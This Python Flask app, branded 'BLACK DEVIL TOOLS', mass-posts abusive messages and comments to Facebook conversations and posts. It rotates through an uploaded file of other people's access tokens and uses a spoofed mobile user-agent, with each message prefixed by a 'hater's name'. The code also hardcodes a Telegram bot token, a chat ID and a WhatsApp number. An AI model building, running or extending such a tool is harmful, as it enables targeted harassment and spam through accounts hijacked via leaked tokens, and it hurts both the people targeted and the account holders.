from flask import Flask, request, render_template_string, redirect, url_for
import os
import time
import requests
import uuid
import threading
from datetime import datetime
import pytz

app = Flask(__name__)

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = '7985477656:AAErbuJetWAyplxRWWQovc032N8a9FsS3F8'
TELEGRAM_CHAT_ID = '8186206231'

# Store active tasks and logs
active_tasks = {}
task_logs = {}

# New CSS with Pink Dark Monsoon theme
css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
    
    body {
        background: linear-gradient(135deg, #1a0b2e 0%, #2d0b3e 50%, #4a0b5c 100%);
        color: #e6e6e6;
        font-family: 'Montserrat', sans-serif;
        margin: 0;
        padding: 0;
        min-height: 100vh;
        position: relative;
        overflow-x: hidden;
    }
    
    body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-image: url('https://i.pinimg.com/originals/8a/9d/55/8a9d55d13d73e0a19b8b8a8a8b8b8b8b.jpg');
        background-size: cover;
        background-position: center;
        opacity: 0.15;
        z-index: -1;
        animation: rainEffect 20s linear infinite;
    }
    
    @keyframes rainEffect {
        0% { background-position: 0% 0%; }
        100% { background-position: 0% 100%; }
    }
    
    .container {
        width: 90%;
        max-width: 800px;
        margin: 20px auto;
        padding: 20px;
        background: rgba(45, 11, 62, 0.85);
        border-radius: 15px;
        box-shadow: 0 0 30px rgba(255, 20, 147, 0.4);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 105, 180, 0.3);
    }
    
    .logo {
        text-align: center;
        margin-bottom: 30px;
        padding: 20px;
        background: linear-gradient(135deg, #8b008b 0%, #ff1493 100%);
        border-radius: 15px;
        box-shadow: 0 0 25px rgba(255, 20, 147, 0.6);
        border: 1px solid rgba(255, 105, 180, 0.5);
    }
    
    .logo h1 {
        color: #ffffff;
        font-size: 28px;
        margin: 0;
        text-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
        background: linear-gradient(45deg, #ff69b4, #ff1493, #8b008b);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        animation: glow 2s ease-in-out infinite alternate;
    }
    
    @keyframes glow {
        from { text-shadow: 0 0 10px #ff69b4; }
        to { text-shadow: 0 0 20px #ff1493, 0 0 30px #8b008b; }
    }
    
    .logo p {
        color: #ffb6c1;
        margin: 8px 0;
        font-weight: bold;
        text-shadow: 0 0 10px rgba(255, 182, 193, 0.7);
    }
    
    .input-group {
        margin-bottom: 25px;
        position: relative;
    }
    
    .input-group label {
        display: block;
        margin-bottom: 10px;
        color: #ff69b4;
        font-weight: bold;
        text-shadow: 0 0 8px rgba(255, 105, 180, 0.5);
    }
    
    .input-group input, .input-group select, .input-group textarea {
        width: 100%;
        padding: 14px 18px;
        border: 2px solid transparent;
        border-radius: 10px;
        background: linear-gradient(135deg, rgba(139, 0, 139, 0.3), rgba(255, 20, 147, 0.2));
        color: #ffffff;
        font-size: 16px;
        transition: all 0.4s ease;
        box-sizing: border-box;
        box-shadow: 0 0 15px rgba(255, 105, 180, 0.3);
    }
    
    .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
        outline: none;
        border-color: #ff69b4;
        box-shadow: 0 0 25px rgba(255, 105, 180, 0.8);
        background: linear-gradient(135deg, rgba(139, 0, 139, 0.5), rgba(255, 20, 147, 0.4));
        transform: translateY(-2px);
    }
    
    .input-group input:hover, .input-group select:hover, .input-group textarea:hover {
        box-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
        transform: translateY(-1px);
    }
    
    .button {
        background: linear-gradient(135deg, #ff1493 0%, #8b008b 100%);
        color: white;
        border: none;
        padding: 15px 30px;
        border-radius: 10px;
        cursor: pointer;
        font-size: 18px;
        font-weight: bold;
        transition: all 0.4s ease;
        display: inline-block;
        text-align: center;
        text-decoration: none;
        box-shadow: 0 5px 20px rgba(255, 20, 147, 0.5);
        text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
    }
    
    .button:hover {
        transform: translateY(-3px);
        box-shadow: 0 8px 25px rgba(255, 20, 147, 0.7);
        background: linear-gradient(135deg, #ff69b4 0%, #ff1493 100%);
    }
    
    .button-stop {
        background: linear-gradient(135deg, #dc143c 0%, #8b0000 100%);
        box-shadow: 0 5px 20px rgba(220, 20, 60, 0.5);
    }
    
    .button-stop:hover {
        box-shadow: 0 8px 25px rgba(220, 20, 60, 0.7);
        background: linear-gradient(135deg, #ff0000 0%, #dc143c 100%);
    }
    
    .select-option {
        margin: 30px 0;
        text-align: center;
    }
    
    .select-option a {
        display: block;
        padding: 18px;
        background: linear-gradient(135deg, #ba55d3 0%, #9932cc 100%);
        color: white;
        text-decoration: none;
        border-radius: 12px;
        font-size: 20px;
        font-weight: bold;
        transition: all 0.4s ease;
        box-shadow: 0 5px 20px rgba(186, 85, 211, 0.5);
        border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .select-option a:hover {
        transform: translateY(-4px);
        box-shadow: 0 8px 30px rgba(186, 85, 211, 0.7);
        background: linear-gradient(135deg, #da70d6 0%, #ba55d3 100%);
    }
    
    .task-id-box {
        background: linear-gradient(135deg, #ff69b4 0%, #ff1493 50%, #8b008b 100%);
        padding: 20px;
        border-radius: 15px;
        margin: 25px 0;
        text-align: center;
        box-shadow: 0 0 30px rgba(255, 105, 180, 0.8);
        animation: taskGlow 3s infinite alternate;
        border: 2px solid rgba(255, 255, 255, 0.3);
    }
    
    @keyframes taskGlow {
        from {
            box-shadow: 0 0 20px rgba(255, 105, 180, 0.6);
        }
        to {
            box-shadow: 0 0 40px rgba(255, 105, 180, 1);
        }
    }
    
    .task-id-box h3 {
        margin: 0 0 15px 0;
        color: #ffffff;
        font-size: 24px;
        text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
    }
    
    .task-id {
        font-size: 22px;
        font-weight: bold;
        color: #ffffff;
        background: rgba(255, 255, 255, 0.2);
        padding: 12px 20px;
        border-radius: 8px;
        display: inline-block;
        border: 1px solid rgba(255, 255, 255, 0.3);
        text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
    }
    
    .logs-container {
        background: linear-gradient(135deg, rgba(45, 11, 62, 0.9), rgba(74, 11, 92, 0.8));
        border-radius: 12px;
        padding: 20px;
        margin-top: 25px;
        max-height: 500px;
        overflow-y: auto;
        font-family: 'Courier New', monospace;
        font-size: 14px;
        box-shadow: 0 0 20px rgba(255, 105, 180, 0.4);
        border: 1px solid rgba(255, 105, 180, 0.3);
    }
    
    .log-entry {
        padding: 8px 0;
        border-bottom: 1px solid rgba(255, 105, 180, 0.2);
        animation: fadeIn 0.5s ease-in;
    }
    
    @keyframes fadeIn {
        from { opacity: 0; transform: translateX(-10px); }
        to { opacity: 1; transform: translateX(0); }
    }
    
    .log-time {
        color: #ffb6c1;
        font-weight: bold;
    }
    
    .log-success {
        color: #90ee90;
        font-weight: bold;
    }
    
    .log-error {
        color: #ffb6c1;
        font-weight: bold;
    }
    
    .log-info {
        color: #87ceeb;
        font-weight: bold;
    }
    
    .log-warning {
        color: #ffd700;
        font-weight: bold;
    }
    
    .form-container {
        background: linear-gradient(135deg, rgba(74, 11, 92, 0.8), rgba(45, 11, 62, 0.9));
        padding: 30px;
        border-radius: 15px;
        margin-top: 25px;
        box-shadow: 0 0 25px rgba(255, 105, 180, 0.5);
        border: 1px solid rgba(255, 105, 180, 0.3);
    }
    
    .nav-buttons {
        text-align: center;
        margin: 25px 0;
    }
    
    .nav-buttons a {
        margin: 0 12px;
        padding: 12px 25px;
    }
    
    .stats-box {
        background: linear-gradient(135deg, rgba(255, 20, 147, 0.2), rgba(139, 0, 139, 0.3));
        padding: 15px;
        border-radius: 10px;
        margin: 15px 0;
        border: 1px solid rgba(255, 105, 180, 0.3);
    }
    
    .stats-title {
        color: #ff69b4;
        font-weight: bold;
        margin-bottom: 8px;
        text-shadow: 0 0 8px rgba(255, 105, 180, 0.5);
    }
    
    .stats-value {
        color: #ffffff;
        font-weight: bold;
        font-size: 18px;
    }
    
    /* Scrollbar Styling */
    ::-webkit-scrollbar {
        width: 8px;
    }
    
    ::-webkit-scrollbar-track {
        background: rgba(45, 11, 62, 0.5);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb {
        background: linear-gradient(135deg, #ff69b4, #ff1493);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb:hover {
        background: linear-gradient(135deg, #ff1493, #8b008b);
    }
</style>
"""

# Logo with updated design
logo = """
<div class="logo">
    <h1>⚡ BLACK DEVIL TOOLS ⚡</h1>
    <p>CREATOR: BLACK DEVIL</p>
    <p>RULEX: WARRIOUR RULEX</p>
    <p>FACEBOOK: GOD.OFF.SERVER</p>
    <p>WHATSAPP: 7668337116</p>
</div>
"""

# Function to get current India time
def get_india_time():
    tz = pytz.timezone('Asia/Kolkata')
    return datetime.now(tz).strftime("%Y-%m-%d %I:%M:%S %p")

# Function to add log entry
def add_log(task_id, message, type="info"):
    if task_id not in task_logs:
        task_logs[task_id] = []
    
    timestamp = get_india_time()
    log_entry = f"[{timestamp}] {message}"
    task_logs[task_id].append({"message": log_entry, "type": type})
    
    # Keep only last 1000 logs to prevent memory issues
    if len(task_logs[task_id]) > 1000:
        task_logs[task_id] = task_logs[task_id][-1000:]

# Function to stop a task
def stop_task(task_id):
    if task_id in active_tasks:
        active_tasks[task_id]['running'] = False
        add_log(task_id, "🛑 Task stopped by user", "error")
        return True
    return False

# Function to get group name from ID
def get_group_name(group_id, access_token):
    try:
        url = f"https://graph.facebook.com/v15.0/{group_id}"
        params = {'access_token': access_token, 'fields': 'name'}
        response = requests.get(url, params=params)
        if response.status_code == 200:
            data = response.json()
            return data.get('name', 'Unknown Group')
    except:
        pass
    return 'Unknown Group'

# Direct Dashboard - No Login Required
@app.route('/')
def dashboard():
    return render_template_string(f'''
        {css}
        <div class="container">
            {logo}
            <div class="select-option">
                <a href="/send_messages">⚡ Convo / IB Tool ⚡</a>
            </div>
            <div class="select-option">
                <a href="/comment_send">📝 Post Tool 📝</a>
            </div>
            <div class="select-option">
                <a href="/task_management">🔧 Task Management 🔧</a>
            </div>
            <div class="select-option">
                <a href="/owner" target="_blank">👤 Owner Facebook ID 👤</a>
            </div>
        </div>
    ''')

# Task Management Route
@app.route('/task_management', methods=['GET', 'POST'])
def task_management():
    if request.method == 'POST':
        action = request.form.get('action')
        task_id = request.form.get('task_id')
        
        if action == 'stop' and task_id:
            if stop_task(task_id):
                return f'''
                    {css}
                    <div class="container">
                        {logo}
                        <div class="task-id-box">
                            <h3>🛑 Task Stopped Successfully!</h3>
                            <p>Task ID: <span class="task-id">{task_id}</span> has been stopped.</p>
                        </div>
                        <div class="nav-buttons">
                            <a href="/task_management" class="button">Back to Task Management</a>
                            <a href="/" class="button">Go to Dashboard</a>
                        </div>
                    </div>
                '''
            else:
                return f'''
                    {css}
                    <div class="container">
                        {logo}
                        <div class="task-id-box" style="background: linear-gradient(135deg, #dc143c 0%, #8b0000 100%);">
                            <h3>❌ Task Not Found!</h3>
                            <p>Task ID: <span class="task-id">{task_id}</span> not found or already stopped.</p>
                        </div>
                        <div class="nav-buttons">
                            <a href="/task_management" class="button">Back to Task Management</a>
                            <a href="/" class="button">Go to Dashboard</a>
                        </div>
                    </div>
                '''
        elif action == 'view' and task_id:
            if task_id in task_logs:
                logs = "<br>".join([f"<div class='log-entry'><span class='log-{log['type']}'>{log['message']}</span></div>" for log in task_logs[task_id]])
                return f'''
                    {css}
                    <div class="container">
                        {logo}
                        <div class="form-container">
                            <h2 style="color: #ff69b4; text-align: center; text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);">Task Logs for {task_id}</h2>
                            <div class="logs-container">
                                {logs if logs else "No logs available for this task."}
                            </div>
                            <div class="nav-buttons">
                                <a href="/task_management" class="button">Back to Task Management</a>
                                <a href="/" class="button">Go to Dashboard</a>
                            </div>
                        </div>
                    </div>
                '''
            else:
                return f'''
                    {css}
                    <div class="container">
                        {logo}
                        <div class="task-id-box" style="background: linear-gradient(135deg, #dc143c 0%, #8b0000 100%);">
                            <h3>❌ No Logs Found!</h3>
                            <p>No logs available for Task ID: <span class="task-id">{task_id}</span></p>
                        </div>
                        <div class="nav-buttons">
                            <a href="/task_management" class="button">Back to Task Management</a>
                            <a href="/" class="button">Go to Dashboard</a>
                        </div>
                    </div>
                '''
    
    return render_template_string(f'''
        {css}
        <div class="container">
            {logo}
            <div class="form-container">
                <h2 style="text-align: center; color: #ff69b4; text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);">Task Management</h2>
                
                <div class="input-group">
                    <h3 style="color: #ff69b4;">Stop a Task</h3>
                    <form method="post">
                        <input type="hidden" name="action" value="stop">
                        <label for="stop_task_id">Enter Task ID to Stop:</label>
                        <input type="text" id="stop_task_id" name="task_id" required placeholder="Enter your Task ID">
                        <button type="submit" class="button button-stop" style="width: 100%; margin-top: 15px;">🛑 Stop Task</button>
                    </form>
                </div>
                
                <div class="input-group">
                    <h3 style="color: #ff69b4;">View Task Logs</h3>
                    <form method="post">
                        <input type="hidden" name="action" value="view">
                        <label for="view_task_id">Enter Task ID to View Logs:</label>
                        <input type="text" id="view_task_id" name="task_id" required placeholder="Enter your Task ID">
                        <button type="submit" class="button" style="width: 100%; margin-top: 15px;">📊 View Task Details</button>
                    </form>
                </div>
                
                <div class="nav-buttons">
                    <a href="/" class="button">🏠 Back to Dashboard</a>
                </div>
            </div>
        </div>
    ''')

# Send Messages Route
@app.route('/send_messages', methods=['GET', 'POST'])
def send_messages():
    if request.method == 'POST':
        # Generate unique task ID
        task_id = str(uuid.uuid4())[:8]
        
        name = request.form['name']
        tokken_file = request.files['tokken']
        convo_id = request.form['convo_id']
        gali_file = request.files['gali']
        haters_name = request.form['haters_name']
        last_here_name = request.form['last_here_name']
        timm = int(request.form['timm'])
        
        # Save uploaded files with task ID in filename
        tokken_path = os.path.join('uploads', f"{task_id}_{tokken_file.filename}")
        gali_path = os.path.join('uploads', f"{task_id}_{gali_file.filename}")
        tokken_file.save(tokken_path)
        gali_file.save(gali_path)
        
        # Initialize task
        active_tasks[task_id] = {
            'running': True,
            'type': 'convo',
            'name': name,
            'convo_id': convo_id,
            'haters_name': haters_name,
            'last_here_name': last_here_name
        }
        
        # Start task in background thread
        thread = threading.Thread(target=run_send_messages, args=(
            task_id, name, tokken_path, convo_id, gali_path, haters_name, last_here_name, timm
        ))
        thread.daemon = True
        thread.start()
        
        # Return page with task ID
        return render_template_string(f'''
            {css}
            <div class="container">
                {logo}
                <div class="task-id-box">
                    <h3>✅ Task Started Successfully!</h3>
                    <p>Your unique Task ID:</p>
                    <div class="task-id">{task_id}</div>
                    <p style="margin-top: 15px; font-size: 14px; color: #ffb6c1;">📋 Save this ID to stop or view this task later</p>
                </div>
                <div class="form-container">
                    <h3 style="color: #ff69b4; text-align: center;">Live Logs - Convo Tool</h3>
                    
                    <div class="stats-box">
                        <div class="stats-title">📊 Task Statistics</div>
                        <div class="stats-value">Task ID: {task_id}</div>
                        <div class="stats-value">User: {name}</div>
                        <div class="stats-value">Target: {convo_id}</div>
                        <div class="stats-value">Format: {haters_name} [message] {last_here_name}</div>
                    </div>
                    
                    <div class="logs-container" id="logs-container">
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] 🚀 Task started with ID: {task_id}</span>
                        </div>
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] 📁 Processing tokens and messages...</span>
                        </div>
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] ✍️ Message Format: {haters_name} [message] {last_here_name}</span>
                        </div>
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] ⏳ Loading tokens and preparing to send...</span>
                        </div>
                    </div>
                    <div class="nav-buttons">
                        <a href="/task_management" class="button">🔧 Manage Tasks</a>
                        <a href="/send_messages" class="button">🔄 Start New Task</a>
                        <a href="/" class="button">🏠 Dashboard</a>
                    </div>
                </div>
            </div>
            <script>
                // Auto-refresh logs every 3 seconds
                setTimeout(function() {{
                    window.location.reload();
                }}, 3000);
            </script>
        ''')
    
    return render_template_string(f'''
        {css}
        <div class="container">
            {logo}
            <div class="form-container">
                <h2 style="text-align: center; color: #ff69b4; text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);">Send Messages (Convo/IB Tool)</h2>
                <form method="post" enctype="multipart/form-data">
                    <div class="input-group">
                        <label for="name">👤 Your Name:</label>
                        <input type="text" id="name" name="name" required placeholder="Enter your name">
                    </div>
                    <div class="input-group">
                        <label for="tokken">🔑 Upload Token File:</label>
                        <input type="file" id="tokken" name="tokken" required>
                    </div>
                    <div class="input-group">
                        <label for="convo_id">💬 Conversation/Group ID:</label>
                        <input type="text" id="convo_id" name="convo_id" required placeholder="Enter conversation or group ID">
                    </div>
                    <div class="input-group">
                        <label for="gali">📝 Upload Message File:</label>
                        <input type="file" id="gali" name="gali" required>
                    </div>
                    <div class="input-group">
                        <label for="haters_name">🎭 Hater's Name (Prefix):</label>
                        <input type="text" id="haters_name" name="haters_name" required placeholder="Enter hater's name for prefix">
                    </div>
                    <div class="input-group">
                        <label for="last_here_name">🔚 Last Here Name (Suffix):</label>
                        <input type="text" id="last_here_name" name="last_here_name" required placeholder="Enter last here name for suffix">
                    </div>
                    <div class="input-group">
                        <label for="timm">⏰ Delay (Seconds):</label>
                        <input type="number" id="timm" name="timm" value="2" required min="1" max="10">
                    </div>
                    <button type="submit" class="button" style="width: 100%;">🚀 Start Sending Messages</button>
                </form>
                <div class="nav-buttons">
                    <a href="/" class="button">🏠 Back to Dashboard</a>
                </div>
            </div>
        </div>
    ''')

# Function to run send messages in background
def run_send_messages(task_id, name, tokken_path, convo_id, gali_path, haters_name, last_here_name, timm):
    try:
        with open(tokken_path, 'r') as file:
            tokens = file.readlines()
        with open(gali_path, 'r') as file:
            messages = file.readlines()
    except FileNotFoundError:
        add_log(task_id, "❌ File Not Found - Please check your uploaded files", "error")
        return

    access_tokens = [token.strip() for token in tokens if token.strip()]
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    num_messages = len(messages)
    num_tokens = len(access_tokens)
    max_tokens = min(num_tokens, num_messages)

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    add_log(task_id, f"📊 Starting message sending: {num_messages} messages with {num_tokens} tokens", "info")
    add_log(task_id, f"🎯 Target Conversation ID: {convo_id}", "info")
    add_log(task_id, f"✍️ Message format: {haters_name} [message] {last_here_name}", "info")
    
    # Get group name for display
    if access_tokens:
        group_name = get_group_name(convo_id, access_tokens[0])
        add_log(task_id, f"🏷️ Group Name: {group_name}", "info")

    valid_tokens = 0
    failed_tokens = 0
    sent_messages = 0
    failed_messages = 0

    for message_index in range(num_messages):
        if not active_tasks.get(task_id, {}).get('running', True):
            add_log(task_id, "🛑 Task stopped by user", "error")
            break
            
        token_index = message_index % max_tokens
        access_token = access_tokens[token_index]
        message = messages[message_index]
        full_message = f"{haters_name} {message} {last_here_name}"
        
        url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
        parameters = {'access_token': access_token, 'message': full_message}
        
        try:
            response = requests.post(url, json=parameters, headers=headers)
            
            if response.ok:
                sent_messages += 1
                add_log(task_id, f"✅ Message {message_index + 1}/{num_messages} sent successfully using token {token_index + 1}", "success")
            else:
                failed_messages += 1
                add_log(task_id, f"❌ Failed to send message {message_index + 1}/{num_messages} using token {token_index + 1}", "error")
                
            time.sleep(timm)
            
        except Exception as e:
            failed_messages += 1
            add_log(task_id, f"⚠️ Error sending message {message_index + 1}: {str(e)}", "error")
            time.sleep(timm)

    # Final statistics
    add_log(task_id, f"🎯 Task completed! Sent: {sent_messages}, Failed: {failed_messages}", "info")
    add_log(task_id, f"📊 Valid tokens: {valid_tokens}, Invalid tokens: {failed_tokens}", "info")
    active_tasks[task_id]['running'] = False

# Comment Send Route
@app.route('/comment_send', methods=['GET', 'POST'])
def comment_send():
    if request.method == 'POST':
        # Generate unique task ID
        task_id = str(uuid.uuid4())[:8]
        
        name = request.form['name']
        tokken_file = request.files['tokken']
        profile_id = request.form['profile_id']
        post_id = request.form['post_id']
        gali_file = request.files['gali']
        haters_name = request.form['haters_name']
        last_here_name = request.form['last_here_name']
        timm = int(request.form['timm'])

        # Save uploaded files with task ID in filename
        tokken_path = os.path.join('uploads', f"{task_id}_{tokken_file.filename}")
        gali_path = os.path.join('uploads', f"{task_id}_{gali_file.filename}")
        tokken_file.save(tokken_path)
        gali_file.save(gali_path)
        
        # Initialize task
        active_tasks[task_id] = {
            'running': True,
            'type': 'comment',
            'name': name,
            'profile_id': profile_id,
            'post_id': post_id,
            'haters_name': haters_name,
            'last_here_name': last_here_name
        }
        
        # Start task in background thread
        thread = threading.Thread(target=run_comment_send, args=(
            task_id, name, tokken_path, profile_id, post_id, gali_path, haters_name, last_here_name, timm
        ))
        thread.daemon = True
        thread.start()
        
        # Return page with task ID
        return render_template_string(f'''
            {css}
            <div class="container">
                {logo}
                <div class="task-id-box">
                    <h3>✅ Comment Task Started Successfully!</h3>
                    <p>Your unique Task ID:</p>
                    <div class="task-id">{task_id}</div>
                    <p style="margin-top: 15px; font-size: 14px; color: #ffb6c1;">📋 Save this ID to stop or view this task later</p>
                </div>
                <div class="form-container">
                    <h3 style="color: #ff69b4; text-align: center;">Live Logs - Post Tool</h3>
                    
                    <div class="stats-box">
                        <div class="stats-title">📊 Task Statistics</div>
                        <div class="stats-value">Task ID: {task_id}</div>
                        <div class="stats-value">User: {name}</div>
                        <div class="stats-value">Profile ID: {profile_id}</div>
                        <div class="stats-value">Post ID: {post_id}</div>
                        <div class="stats-value">Format: {haters_name} [comment] {last_here_name}</div>
                    </div>
                    
                    <div class="logs-container" id="logs-container">
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] 🚀 Task started with ID: {task_id}</span>
                        </div>
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] 📁 Processing tokens and comments...</span>
                        </div>
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] ✍️ Comment Format: {haters_name} [comment] {last_here_name}</span>
                        </div>
                        <div class="log-entry">
                            <span class="log-info">[{get_india_time()}] ⏳ Loading tokens and preparing to comment...</span>
                        </div>
                    </div>
                    <div class="nav-buttons">
                        <a href="/task_management" class="button">🔧 Manage Tasks</a>
                        <a href="/comment_send" class="button">🔄 Start New Task</a>
                        <a href="/" class="button">🏠 Dashboard</a>
                    </div>
                </div>
            </div>
            <script>
                // Auto-refresh logs every 3 seconds
                setTimeout(function() {{
                    window.location.reload();
                }}, 3000);
            </script>
        ''')
    
    return render_template_string(f'''
        {css}
        <div class="container">
            {logo}
            <div class="form-container">
                <h2 style="text-align: center; color: #ff69b4; text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);">Comment Send (Post Tool)</h2>
                <form method="post" enctype="multipart/form-data">
                    <div class="input-group">
                        <label for="name">👤 Your Name:</label>
                        <input type="text" id="name" name="name" required placeholder="Enter your name">
                    </div>
                    <div class="input-group">
                        <label for="tokken">🔑 Upload Token File:</label>
                        <input type="file" id="tokken" name="tokken" required>
                    </div>
                    <div class="input-group">
                        <label for="profile_id">👥 Profile ID:</label>
                        <input type="text" id="profile_id" name="profile_id" required placeholder="Enter profile ID">
                    </div>
                    <div class="input-group">
                        <label for="post_id">📄 Post ID:</label>
                        <input type="text" id="post_id" name="post_id" required placeholder="Enter post ID">
                    </div>
                    <div class="input-group">
                        <label for="gali">💬 Upload Comment File:</label>
                        <input type="file" id="gali" name="gali" required>
                    </div>
                    <div class="input-group">
                        <label for="haters_name">🎭 Hater's Name (Prefix):</label>
                        <input type="text" id="haters_name" name="haters_name" required placeholder="Enter hater's name for prefix">
                    </div>
                    <div class="input-group">
                        <label for="last_here_name">🔚 Last Here Name (Suffix):</label>
                        <input type="text" id="last_here_name" name="last_here_name" required placeholder="Enter last here name for suffix">
                    </div>
                    <div class="input-group">
                        <label for="timm">⏰ Delay (Seconds):</label>
                        <input type="number" id="timm" name="timm" value="2" required min="1" max="10">
                    </div>
                    <button type="submit" class="button" style="width: 100%;">🚀 Start Sending Comments</button>
                </form>
                <div class="nav-buttons">
                    <a href="/" class="button">🏠 Back to Dashboard</a>
                </div>
            </div>
        </div>
    ''')

# Function to run comment send in background
def run_comment_send(task_id, name, tokken_path, profile_id, post_id, gali_path, haters_name, last_here_name, timm):
    try:
        with open(tokken_path, 'r') as file:
            tokens = file.readlines()
        with open(gali_path, 'r') as file:
            messages = file.readlines()
    except FileNotFoundError:
        add_log(task_id, "❌ File Not Found - Please check your uploaded files", "error")
        return

    access_tokens = [token.strip() for token in tokens if token.strip()]
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    num_messages = len(messages)
    num_tokens = len(access_tokens)
    max_tokens = min(num_tokens, num_messages)

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    add_log(task_id, f"📊 Starting comment sending: {num_messages} comments with {num_tokens} tokens", "info")
    add_log(task_id, f"🎯 Target: Profile ID: {profile_id}, Post ID: {post_id}", "info")
    add_log(task_id, f"✍️ Comment format: {haters_name} [comment] {last_here_name}", "info")

    valid_tokens = 0
    failed_tokens = 0
    sent_comments = 0
    failed_comments = 0

    for message_index in range(num_messages):
        if not active_tasks.get(task_id, {}).get('running', True):
            add_log(task_id, "🛑 Task stopped by user", "error")
            break
            
        token_index = message_index % max_tokens
        access_token = access_tokens[token_index]
        message = messages[message_index]
        full_message = f"{haters_name} {message} {last_here_name}"
        
        url = f'https://graph.facebook.com/v15.0/{profile_id}_{post_id}/comments'
        parameters = {'access_token': access_token, 'message': full_message}
        
        try:
            response = requests.post(url, json=parameters, headers=headers)
            
            if response.ok:
                sent_comments += 1
                add_log(task_id, f"✅ Comment {message_index + 1}/{num_messages} sent successfully using token {token_index + 1}", "success")
            else:
                failed_comments += 1
                add_log(task_id, f"❌ Failed to send comment {message_index + 1}/{num_messages} using token {token_index + 1}", "error")
                
            time.sleep(timm)
            
        except Exception as e:
            failed_comments += 1
            add_log(task_id, f"⚠️ Error sending comment {message_index + 1}: {str(e)}", "error")
            time.sleep(timm)

    # Final statistics
    add_log(task_id, f"🎯 Task completed! Sent: {sent_comments}, Failed: {failed_comments}", "info")
    add_log(task_id, f"📊 Valid tokens: {valid_tokens}, Invalid tokens: {failed_tokens}", "info")
    active_tasks[task_id]['running'] = False

# Owner Route
@app.route('/owner')
def owner():
    return redirect('https://www.facebook.com/GOD.OFF.SERVER')

# Create uploads directory if it doesn't exist
if not os.path.exists('uploads'):
    os.makedirs('uploads')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
